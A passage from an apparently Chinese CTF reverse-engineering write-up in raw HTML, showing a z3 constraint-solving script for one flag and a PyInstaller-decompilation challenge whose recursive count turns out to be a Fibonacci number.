operator">*</span> f10 <span class="token operator">+</span> <span class="token number">31</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">51</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">120884</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">51</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">80</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">57</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">118151</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">51</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">105637</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">39</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">34</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">80</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">47</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">168627</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">123563</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">83</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">81</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">61</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">94</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">125124</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">40</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">79</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">95</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">30</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">30</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">126844</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">61</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">71</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">34</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">116479</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">51</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">56</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">80</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">76</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">79</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">94</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">139277</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>  <span class="token number">3</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">87</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">71</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">47</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">109760</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">58</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">51</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">94</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">76</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">121674</span><span class="token punctuation">)</span><span class="token keyword">if</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat<span class="token punctuation">:</span>m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#得到一组解，m为字典类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment">#遍历字典中所有values值</span><span class="token keyword">for</span> d <span class="token keyword">in</span> m<span class="token punctuation">.</span>decls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag.append(chr(m[d].as_long()))</span>flag<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag.insert(int(d.name()[1:]),chr(m[d].as_long()))</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-ez-dp"><a href="#4-ez-dp" class="headerlink" title="4. ez_dp"></a>4. ez_dp</h2><p>这个二进制程序使用python写的，然后打包而成。</p><p>首先我们使用 <code>pyinstxtractor</code>提取exe中的资源。</p><p>然后使用 <code>uncompyle6 t4.pyc test.py</code>反向编译python产生的字节码</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20221113135207.png" alt="uncompyle6"></p><p>把代码从终端复制到python文件中，可以找到跟flag有关的代码。是一个递归。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> lru_cache<span class="token decorator annotation punctuation">@lru_cache</span><span class="token punctuation">(</span>maxsize<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">gogogo</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> x <span class="token operator">>=</span> <span class="token number">100</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>flag <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">return</span>        self<span class="token punctuation">.</span>gogogo<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>gogogo<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>gogogo<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>flag<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'scuctf&#123;'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一开始我是傻乎乎地用计算机去算，结果发现计算机根本算不出来这个。最后发现这个跟 <code>斐波拉契数列</code>有关系。这个值就是 <code>f(102)</code>。</p><p>可以先算几个较小的 <code> x = 0 ; x = 1; x = 2; x = 3;</code>，然后去找这些算出来的结果和 <code>斐波拉契数列值</code>的关系.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> N <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">def</span> <span class="token function">go</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> x <span class="token operator">>=</span> N<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>flag <span class="token operator">+=</span> <span class="token number">1</span>                    <span class="token keyword">return</span>                 go<span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>                go<span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>            go<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token number">1</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">13</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">21</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">34</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">55</span><span class="token number">9</span><span class="token punctuation">:</span> <span class="token number">89</span><span class="token number">10</span><span class="token punctuation">:</span> <span class="token number">144</span><span class="token number">11</span><span class="token punctuation">:</span> <span class="token number">233</span><span class="token number">12</span><span class="token punctuation">:</span> <span class="token number">377</span><span class="token number">13</span><span class="token punctuation">:</span> <span class="token number">610</span><span class="token number">14</span><span class="token punctuation">:</span> <span class="token number">987</span><span class="token number">15</span><span class="token punctuation">:</span> <span class="token number">1597</span><span class="token number">16</span><span class="token punctuation">:</span> <span class="token number">2584</span><span class="token number">17</span><span class="token punctuation">:</span> <span class="token number">4181</span><span class="token number">18</span><span class="token punctuation">:</span> <span class="token number">6765</span><span class="token 